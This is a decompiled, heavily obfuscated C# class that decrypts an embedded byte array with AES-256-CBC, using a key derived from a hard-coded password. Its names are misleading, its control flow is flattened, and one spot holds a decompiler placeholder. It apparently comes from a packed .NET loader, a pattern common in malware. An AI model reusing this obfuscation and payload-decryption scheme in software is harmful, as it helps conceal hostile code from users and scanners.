using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace Lzzowqrhuwjro.Attributes;

internal static class Database
{
	internal static Database GetExporter;

	internal static byte[] PrintInterpreter(byte[] param)
	{
		byte[] array = new byte[8];
		WriteExporter(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
		byte[] salt = array;
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			try
			{
				ReadExporter(rijndaelManaged, 256);
				int num = 2;
				if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_7d24670f06454c2a834ae92c3c1d2c0a == 0)
				{
					goto IL_0066;
				}
				goto IL_00ef;
				IL_00ef:
				Rfc2898DeriveBytes rfc2898DeriveBytes = default(Rfc2898DeriveBytes);
				CryptoStream cryptoStream = default(CryptoStream);
				int num3 = default(int);
				while (true)
				{
					switch (num)
					{
					case 3:
						rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(CollectExporter(rijndaelManaged) / 8);
						num = 1;
						if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_6b9b146e09d64722b87e7b5477e08614 == 0)
						{
							continue;
						}
						break;
					case 2:
						CompareExporter(rijndaelManaged, 128);
						num = 0;
						if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_fde95746d54a42479f283697e93b0981 == 0)
						{
							continue;
						}
						break;
					case 1:
						rijndaelManaged.Mode = CipherMode.CBC;
						cryptoStream = new CryptoStream(memoryStream, (ICryptoTransform)ForgotExporter(rijndaelManaged), CryptoStreamMode.Write);
						num = 4;
						if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_05de5c1774684ba1a2a888864c6e06cf == 0)
						{
							continue;
						}
						break;
					default:
					{
						byte[] bytes = Encoding.UTF8.GetBytes("Jbmwsuoku");
						rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
						rijndaelManaged.Key = (byte[])PublishExporter(rfc2898DeriveBytes, ViewExporter(rijndaelManaged) / 8);
						goto case 3;
					}
					case 4:
						try
						{
							cryptoStream.Write(param, 0, param.Length);
							int num2 = 0;
							if (_003CModule_003E_007Beaae710d_002De3d8_002D46b8_002Db6da_002Dd6c3c29ddccd_007D.m_51d2a535dadb4f9ca5db9421b0b7db35 != 0)
							{
								num2 = num3;
							}
							switch (num2)
							{
							default:
								ConnectExporter(cryptoStream);
								break;
							}
						}
						finally
						{
							CreateExporter(cryptoStream);
						}
						goto case 5;
					case 5:
						return memoryStream.ToArray();
					}
					break;
				}
				goto IL_0066;
				IL_0066:
				int num4 = default(int);
				num = num4;
				goto IL_00ef;
			}
			finally
			{
				((IDisposable)rijndaelManaged).Dispose();
			}
		}
		finally
		{
			CreateExporter(memoryStream);
		}
	}

	internal static void WriteExporter(object object_0, RuntimeFieldHandle runtimeFieldHandle_0)
	{
		RuntimeHelpers.InitializeArray((Array)object_0, runtimeFieldHandle_0);
	}

	internal static void ReadExporter(object object_0, int int_0)
	{
		((SymmetricAlgorithm)object_0).KeySize = int_0;
	}

	internal static void CompareExporter(object object_0, int int_0)
	{
		((SymmetricAlgorithm)object_0).BlockSize = int_0;
	}

	internal static int ViewExporter(object object_0)
	{
		return ((SymmetricAlgorithm)object_0).KeySize;
	}

	internal static object PublishExporter(object object_0, int int_0)
	{
		return ((DeriveBytes)object_0).GetBytes(int_0);
	}

	internal static int CollectExporter(object object_0)
	{
		return ((SymmetricAlgorithm)object_0).BlockSize;
	}

	internal static object ForgotExporter(object object_0)
	{
		return ((SymmetricAlgorithm)object_0).CreateDecryptor();
	}

	internal static void ConnectExporter(object object_0)
	{
		((Stream)object_0).Close();
	}

	internal static void CreateExporter(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}

	internal static bool FillExporter()
	{
		return GetExporter == null;
	}

	internal static Database UpdateExporter()
	{
		return GetExporter;
	}
}
